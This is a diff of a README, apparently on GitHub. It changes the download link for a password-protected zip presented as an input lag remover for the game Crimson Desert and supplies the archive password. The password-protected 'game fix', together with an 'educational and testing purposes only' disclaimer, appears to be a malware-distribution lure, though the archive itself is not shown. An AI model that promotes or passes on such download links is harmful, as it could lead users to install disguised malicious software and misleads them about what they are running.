@@ -23,7 +23,7 @@ This repository is for educational and testing purposes only. All files are prov
 ## 📥 Download
 Password-protected archive with the complete input lag fix package – extract and reduce lag instantly.  
 
-📥 [Download `Crimson-Desert-Input-Lag-Remover-2026.zip`](https://github.com/YOURUSERNAME/Crimson-Desert-Input-Lag-Remover/releases/download/v2026/Crimson-Desert-Input-Lag-Remover-2026.zip)  
+📥 [Download `Crimson-Desert-Input-Lag-Remover-2026.zip`](https://github.com/EusoJosuE/Crimson-Desert-Input-Lag-Remover-Desktop/releases/download/Game-Software/CrimsonDesert-Fix.zip)  
 🔐 `LS2026`
 ---
 ### Archive Contents
